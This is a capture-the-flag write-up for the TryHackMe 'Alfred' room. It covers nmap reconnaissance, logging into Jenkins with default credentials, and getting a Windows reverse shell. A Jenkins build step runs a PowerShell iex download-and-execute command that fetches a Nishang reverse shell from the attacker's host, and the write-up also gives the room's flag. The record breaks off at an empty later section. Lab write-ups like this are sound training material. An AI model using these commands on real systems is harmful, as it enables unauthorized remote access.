# Alfred

Room [Alfred](https://tryhackme.com/room/alfred)

#

<h3>Make a Directory with the Room Name in the TryHackMe Folder</h3>

- Change directory to /Desktop/Tryhackme.

`cd Desktop/Tryhackme`

- Change a new directory call "Alfred".

`mkdir Alfred`

- Change directory into Alfred.

`cd Alfred/`

<p align="center"> <img src="https://i.imgur.com/JfDQGWn.png" height="90%" width="90%" alt=""/>

<h2></h2>

<h3>Deploy the Machine</h3>

Deploy the machine by connecting to TryHackMe network. 

Temporary IP Address: [10.10.198.142]

Introduction: 
In this session, we'll discover how to take advantage of a common mistake in a popular automation server called Jenkins. Jenkins is a tool that helps developers automatically deploy their code when they make changes. We'll explore a specific misconfiguration in Jenkins and then use a cool method to increase our system access.

Because Jenkins runs on Windows, we'll rely on a tool called Nishang to start things off. Nishang provides a bunch of helpful scripts for getting initial access, figuring out what's on the system, and boosting our privileges. In this scenario, we'll specifically use scripts that create reverse shells, allowing us to gain control.

# 

# Initial Access Questions

Question 1: How many ports are open? (TCP only)

Question 2: What is the username and password for the login panel? (in the format username:password)

Question 3: What is the user.txt flag? 

#

# Question 1

<h3>Reconnaissance</h3>

Gather the Information from the Target Machine with `Nmap` Command. Find the open ports on the machine.

On Terminal: `nmap -sC -sV -oN nmap_initial.txt 10.10.198.142`

- `nmap`: This is the command used to run the Nmap tool.
- `-sC`: To perform script scanning.
- `-sV`: To detect the version of services.
- `-oN nmap_initial.txt`: To save the scan results in a file named "nmap_initial.txt."
- The target IP address is `10.10.225.162`.

<p align="center"> <img src="https://i.imgur.com/KGKrnuy.png" height="90%" width="90%" alt=""/>

Question 1: How many ports are open? (TCP only)

`3`

#

# Question 2

Navigate to 10.10.198.142 on browser.
- Nothing really special was found.

<p align="center"> <img src="https://i.imgur.com/zPbi2cf.png" height="90%" width="90%" alt=""/>

Since we found another HTTP port (8080) with nmap, we will navigate to 10.10.198.142:8080 on browser.
- Sign in page Jenkins was found.

<p align="center"> <img src="https://i.imgur.com/pSOhBf1.png" height="90%" width="90%" alt=""/>

During a CTF session, when we go on a login webpage, try the default username and password.
- Google: Jenkins default username and password.

<p align="center"> <img src="https://i.imgur.com/x6nUawI.png" height="90%" width="90%" alt=""/>

I tried the admin:password but it didn't work so I tried admin:admin as password and it worked.

<p align="center"> <img src="https://i.imgur.com/DRSN9Rq.png" height="90%" width="90%" alt=""/>

Question 2: What is the username and password for the login panel? (in the format username:password)

`admin:admin`

#

# Question 3

Navigate to https://github.com/samratashok/nishang/blob/master/Shells/Invoke-PowerShellTcp.ps1 
- To download: Nishang reverse shell scripts

Open up the reverse shell scripts that you just downloaded and edit:
- Navigate to the bottom of the script
- Add: `Invoke-PowerShellTcp -Reverse -IPAddress your-ip -Port your-port`
- My case: `Invoke-PowerShellTcp -Reverse -IPAddress 10.6.106.187 -Port 1202`
- Save it and Exit out.

<p align="center"> <img src="https://i.imgur.com/T97QXaU.png" height="90%" width="90%" alt=""/>

We will need to make it available for the server to download. By creating an http server with python.

Open another terminal, we will need to use the ncat command to listen for connection on port 1202.

On Terminal: `python3 -m http.server 80`
On New Terminal: `ncat -nlvp 1202`

<p align="center"> <img src="https://i.imgur.com/YKa2lml.png" height="90%" width="90%" alt=""/>

Navigate back to the Jenkins webpage > Click on the down arrow on "project" > Select "Configure".

<p align="center"> <img src="https://i.imgur.com/FE8WBan.png" height="90%" width="90%" alt=""/>

Scroll down to Build section and put in: `powershell iex (New-Object Net.WebClient).DownloadString('http://10.6.106.187:80/Invoke-PowerShellTcp.ps1') ` > Save.

- IEX stands for invoke expression which will evaluate and load whatever is passed onto it, which in this case is the Invoke-PowerShellTcp.ps1 script.

- IP is your own IP Address with port 80.

<p align="center"> <img src="https://i.imgur.com/kiyh9FC.png" height="90%" width="90%" alt=""/>

Click on "Build Now" > Build History will change.

<p align="center"> <img src="https://i.imgur.com/doZPaha.png" height="90%" width="90%" alt=""/>

Successully got into Jenkins workspace with `ncat`.

<p align="center"> <img src="https://i.imgur.com/6Z2qKho.png" height="90%" width="90%" alt=""/>

Let's go back in directories by using `cd`.

On Terminal: `cd ../../../..`

<p align="center"> <img src="https://i.imgur.com/PE1SLIz.png" height="90%" width="90%" alt=""/>

We will find the user and get into their desktop.

<p align="center"> <img src="https://i.imgur.com/TtmtPiH.png" height="90%" width="90%" alt=""/>

We will now use `ls` to see what file the user has.

<p align="center"> <img src="https://i.imgur.com/m0fxqex.png" height="90%" width="90%" alt=""/>

Look into the "user.txt" by using `type` command.
- Successfully captured the flag.

<p align="center"> <img src="https://i.imgur.com/tTL3FBC.png" height="90%" width="90%" alt=""/>

Question 3: What is the user.txt flag? 

`79007a09481963edf2e1321abd9ae2a0`

#

# Switching Shells Questions

Question 1: 

What is the final size of the exe payload that you generated?

#

# Question 1





